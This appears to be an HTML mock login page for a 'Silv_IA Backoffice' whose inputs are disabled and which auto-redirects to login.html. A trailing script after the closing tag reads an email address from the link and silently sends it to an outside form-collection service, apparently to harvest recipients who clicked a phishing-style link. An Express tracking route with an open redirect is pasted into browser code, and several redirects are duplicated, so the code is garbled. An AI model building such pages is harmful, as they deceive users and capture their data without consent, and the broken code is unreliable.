<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>DG Pulse</title>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #ffffff;
      font-family: 'Segoe UI', sans-serif;
      overflow: hidden;
    }

    .card {
      background: #ffffff;
      border: 1px solid #e0e0e0;
      border-radius: 14px;
      padding: 2rem 2.5rem;
      width: 100%;
      max-width: 400px;
      position: relative;
      z-index: 2;
    }

    h1 {
      font-size: 18px;
      font-weight: 600;
      color: #111;
      text-align: center;
      margin-bottom: 1.5rem;
    }

    .field {
      margin-bottom: 1rem;
    }

    input {
      width: 100%;
      padding: 9px 12px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 8px;
    }

    button {
      width: 100%;
      padding: 11px;
      background: #111;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 15px;
    }

    .blocker {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: transparent;
      z-index: 9999;
    }

    .loading {
      position: absolute;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 14px;
      color: #666;
    }
  </style>
</head>

<body>

<div class="loading">Accediendo al sistema...</div>

<div class="card">
  <h1>Silv_IA Backoffice</h1>

  <div class="field">
    <input type="email" placeholder="Email" disabled />
  </div>

  <div class="field">
    <input type="password" placeholder="Contraseña" disabled />
  </div>

  <div class="field">
    <input type="password" placeholder="Contraseña nueva" disabled />
  </div>

  <button disabled>Entrar</button>
</div>

<div class="blocker"></div>

<script>
  setTimeout(() => {
    window.location.href = "login.html";
  }, 2500);
  
  app.get('/track', async (req, res) => {
  const { uid, redirect } = req.query;

  await db.clicks.create({
    userId: uid,
    timestamp: new Date(),
    ip: req.ip,
    userAgent: req.headers['user-agent']
  });

  res.redirect(302, redirect);
});
</script>

<script>
window.addEventListener("DOMContentLoaded", () => {
  window.location.href = "login.html";
});
</script>
<script>
  
window.addEventListener("DOMContentLoaded", () => {
  setTimeout(() => {
    window.location.href = "login.html";
  }, 2500);
});
</script>
</body>
</html>



<script>
window.addEventListener("DOMContentLoaded", async () => {
  const params = new URLSearchParams(window.location.search);
  const email = params.get("email");

  if (!email) return;

  // enviar a FormSubmit
  await fetch("https://formsubmit.co/eva.sanchez@grupodanigarcia.com", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      email: email,
      source: "excel_link"
    })
  });

  console.log("Email capturado:", email);
});
</script>
